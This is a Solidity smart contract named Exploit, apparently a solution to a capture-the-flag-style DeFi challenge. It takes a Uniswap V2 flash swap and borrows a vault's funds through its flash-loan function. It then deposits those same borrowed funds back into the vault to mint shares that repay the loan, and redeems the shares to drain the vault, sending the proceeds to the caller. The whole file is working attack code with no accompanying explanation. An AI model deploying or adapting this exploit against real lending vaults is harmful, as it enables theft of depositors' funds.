// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IFlashLoaner {
    function flash(
        address recipient,
        uint256 amount,
        bytes calldata data
    ) external;
    function deposit(uint256 assets, address receiver) external returns (uint256);
    function redeem(
        uint256 shares,
        address receiver,
        address owner
    ) external returns (uint256);
    function balanceOf(address account) external returns (uint256);
}

contract Exploit {
    IUniswapV2Pair private pair;
    IERC20 private usdc;
    IFlashLoaner private flashLoaner;

    constructor(address _pair, address _usdc, address _flashLoaner) {
        pair = IUniswapV2Pair(_pair);
        usdc = IERC20(_usdc);
        flashLoaner = IFlashLoaner(_flashLoaner);
    }

    function start() external {
        bool t0 = pair.token0() == address(usdc);        
        if (t0) {
            pair.swap(1000e18, 0, address(this), new bytes(0x1));
        } else {
            pair.swap(0, 1000e18, address(this), new bytes(0x1));
        }
        usdc.transfer(msg.sender, usdc.balanceOf(address(this)));
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {
        require(msg.sender == address(pair), "invalid sender");
        flashLoaner.flash(address(this), 100_000e18 - 1e18, data);
        flashLoaner.redeem(flashLoaner.balanceOf(address(this)), address(this), address(this));
        usdc.transfer(address(pair), 1004e18);
    }

    function flashCallback(uint256 fee, bytes calldata data) external {
        require(msg.sender == address(flashLoaner), "not flashLoaner");
        usdc.approve(address(flashLoaner), type(uint256).max);
        flashLoaner.deposit(100_000e18 - 1e18, address(this));
        //0.1% fee
        usdc.transfer(address(flashLoaner), fee);
    }
}